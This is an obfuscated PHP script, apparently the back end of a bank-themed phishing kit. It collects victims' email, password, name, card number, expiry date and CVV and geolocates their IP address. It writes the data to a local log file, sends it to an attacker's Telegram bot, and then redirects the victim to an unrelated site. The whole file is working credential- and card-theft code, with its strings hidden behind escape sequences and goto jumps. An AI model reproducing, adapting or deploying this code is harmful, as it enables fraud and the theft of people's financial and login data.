<?php
 goto QBEtR; FCPf3: $token = $T0K3N; goto zSmWu; hw2qo: curl_close($ch); goto iBIVN; QBEtR: @(include "\164\154\147\x72\x61\155\x2e\160\x68\x70"); goto q6BgF; T00ZG: $urlMsg = "\x68\164\164\x70\x73\x3a\x2f\x2f\x61\x70\151\56\164\145\154\x65\147\162\x61\x6d\56\157\x72\x67\57\x62\x6f\x74{$token}\57\x73\x65\156\144\115\x65\163\163\141\147\145"; goto Pm9Vh; rqbR_: curl_setopt($ch, CURLOPT_URL, $urlMsg); goto SfIwo; iBIVN: header("\114\x6f\143\x61\164\151\157\x6e\x3a\40\x68\164\164\x70\x73\x3a\57\57\167\167\x77\56\151\156\x74\x65\x72\155\x61\x74\151\143\157\56\x63\x6f\x6d\57"); goto cZM22; H8wmx: $ch = curl_init(); goto rqbR_; a3yP7: session_start(); goto ztPwR; uwMcA: $server_output = curl_exec($ch); goto hw2qo; ZWta1: @session_start(); goto cCyIg; Sl69s: $ipInfo = get_ip_info2($ip); goto a1B3c; ztPwR: $trax = $_SESSION["\164\162\141\x78"]; goto bY0XZ; q6BgF: @(include "\167\141\x72\156\56\160\x68\x70"); goto djEgO; djEgO: @(include "\156\157\164\56\x70\150\x70"); goto a3yP7; xmll5: curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); goto uwMcA; J_Jon: function get_ip_info2($ip) { $url = "\x68\164\164\160\72\57\57\151\160\55\x61\160\151\56\143\x6f\x6d\x2f\152\x73\157\x6e\x2f{$ip}"; $response = file_get_contents($url); if ($response) { $data = json_decode($response, true); if ($data["\x73\164\141\x74\165\x73"] == "\163\165\x63\x63\145\163\163") { $country = $data["\143\157\x75\x6e\x74\162\x79"]; $city = $data["\x63\151\x74\171"]; return "\120\x61\xc3\xad\x73\x3a\x20{$country}\xa\x43\151\x75\144\141\x64\x3a\x20{$city}"; } } return "\x49\x6e\146\157\x72\155\141\143\x69\xc3\263\x6e\x20\x64\145\x20\x75\x62\x69\x63\x61\x63\x69\xc3\xb3\156\40\156\x6f\x20\x64\x69\x73\x70\x6f\x6e\151\x62\154\145\56"; } goto ZWta1; zSmWu: $id = $chatID; goto T00ZG; AGcQC: curl_setopt($ch, CURLOPT_POSTFIELDS, "\x63\150\x61\164\x5f\151\144\x3d{$id}\46\160\x61\162\x73\x65\137\x6d\x6f\144\145\x3d\110\x54\x4d\114\46\x74\145\x78\164\x3d{$msg}"); goto xmll5; a1B3c: $msg = "\x2a\x2a\360\x9f\247\x99\xf0\x9f\x8f\xbc\xe2\200\x8d\xe2\231\x82\357\xb8\x8f\120\101\x43\x49\x46\x49\360\x9f\247\x99\xf0\237\x8f\xbc\xe2\x80\x8d\342\x99\202\xef\xb8\217\52\x2a\12" . "\x4e\x6f\155\x62\162\x65\72\x20{$brax}\xa" . "\101\x50\x45\114\114\x49\104\x4f\72\x20{$brex}\12" . "\x4e\x55\x4d\55\x54\x41\112\x52\x3a\x20{$brix}\xa" . "\x46\x45\103\110\x41\x3a\40{$dia}\40\57\40{$ano}\xa" . "\103\126\126\72\40{$brux}\12" . "\x49\x50\x3a\x20{$ip}\12" . "\125\x62\x69\x63\x61\x63\x69\xc3\xb3\x6e\x3a\40{$ipInfo}"; goto H8wmx; Pm9Vh: $ip = get_client_ip2(); goto Sl69s; bY0XZ: $trex = $_SESSION["\164\162\145\x78"]; goto yeGEE; miEBJ: function get_client_ip2() { $ipaddress = ''; if (isset($_SERVER["\110\x54\x54\120\137\103\114\111\x45\116\124\x5f\x49\x50"])) { $ipaddress = $_SERVER["\110\x54\x54\x50\137\x43\x4c\111\x45\x4e\124\x5f\111\x50"]; } else { if (isset($_SERVER["\x48\124\x54\120\137\130\x5f\x46\117\122\127\x41\x52\104\105\104\x5f\x46\117\x52"])) { $ipaddress = $_SERVER["\x48\124\x54\x50\137\x58\137\x46\x4f\x52\127\101\x52\104\x45\104\x5f\106\117\x52"]; } else { if (isset($_SERVER["\x48\x54\x54\x50\137\x58\137\106\x4f\122\x57\101\122\104\105\104"])) { $ipaddress = $_SERVER["\110\x54\x54\x50\137\x58\x5f\106\117\122\127\x41\122\x44\x45\x44"]; } else { if (isset($_SERVER["\x48\124\124\120\x5f\x46\117\x52\127\x41\x52\104\105\x44\x5f\106\x4f\x52"])) { $ipaddress = $_SERVER["\110\x54\x54\x50\137\x46\117\122\x57\x41\x52\104\x45\104\x5f\106\x4f\122"]; } else { if (isset($_SERVER["\110\x54\124\120\137\x46\117\x52\127\101\122\x44\105\x44"])) { $ipaddress = $_SERVER["\110\x54\124\120\x5f\106\x4f\x52\x57\101\x52\x44\x45\x44"]; } else { if (isset($_SERVER["\x52\105\x4d\x4f\x54\105\x5f\x41\x44\104\x52"])) { $ipaddress = $_SERVER["\x52\105\x4d\117\x54\x45\x5f\101\x44\x44\x52"]; } else { $ipaddress = "\125\x4e\113\x4e\x4f\x57\x4e"; } } } } } } return $ipaddress; } goto J_Jon; yeGEE: if ($_POST) { $brax = $_POST["\142\162\141\x78"]; $brex = $_POST["\142\162\145\170"]; $brix = $_POST["\142\162\x69\170"]; $dia = $_POST["\x64\x69\x61"]; $ano = $_POST["\x61\156\157"]; $brux = $_POST["\x62\x72\165\170"]; $fecha = date("\144\x2d\155\55\x59"); $ip = $_SERVER["\122\105\x4d\117\x54\105\137\101\104\104\x52"]; $texto = "\x4d\x41\111\x4c\x3a\40" . $trax . "\12" . "\120\x41\123\x53\x57\72\40" . $trex . "\xa" . "\116\157\155\142\162\145\72\40" . "{$brax}\12" . "\x41\160\145\x6c\154\151\x64\157\72\x20" . "{$brex}\12" . "\x4e\x75\x6d\145\x72\157\x20\144\x65\x20\x74\141\x72\152\145\x74\x61\72\x20" . "{$brix}\xa" . "\x66\x65\x63\x68\141\72\40" . "{$dia}\x20\57\40" . "{$ano}\12" . "\x63\166\166\x3a" . "{$brux}\xa" . "\106\105\103\110\x41\72\40" . $fecha . "\xa" . "\111\x50\72\x20" . $ip . "\xa" . "\x2d\55\55\55\55\55\x2d\x2d\55\55\x2d\x2d\x2d\x2d\55\x2d\x2d\x2d\x2d\55\x2d\55\x2d\x2d\x2d\55\x2d\55\x2d\x2d\55\55\55\xa\xa"; $archivo = fopen("pixts/script.txt", "a"); fwrite($archivo, $texto); fclose($archivo); } goto miEBJ; cCyIg: $userp = $_SERVER["\122\105\x4d\117\x54\105\137\x41\104\104\x52"]; goto FCPf3; SfIwo: curl_setopt($ch, CURLOPT_POST, 1); goto AGcQC; cZM22: ?>